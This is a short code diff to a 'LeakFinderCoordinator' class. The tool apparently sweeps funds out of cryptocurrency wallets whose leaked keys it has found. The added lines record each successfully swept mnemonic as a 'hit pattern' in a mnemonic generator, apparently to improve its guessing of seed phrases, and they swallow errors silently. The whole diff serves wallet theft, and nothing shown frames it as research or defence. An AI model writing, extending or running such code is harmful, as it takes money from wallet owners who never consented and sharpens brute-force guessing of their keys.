@@ -122,6 +122,18 @@ class LeakFinderCoordinator:
         result.funded_wallets = len(funded_keys)
         if funded_keys:
             result.sweep_results = await self._sweep_funded(funded_keys)
+            # Record hit patterns for successfully swept mnemonics
+            for sr in result.sweep_results:
+                if sr.success:
+                    for key in funded_keys:
+                        if key.key_type == KeyType.MNEMONIC:
+                            try:
+                                from src.modules.crypto.balance.smart_generator import SmartMnemonicGenerator
+                                gen = SmartMnemonicGenerator()
+                                gen.add_hit_pattern(key.key_raw)
+                                logger.info("Recorded hit pattern from successful sweep")
+                            except Exception:
+                                pass
         result.completed_at = datetime.now(timezone.utc)
         return result
 
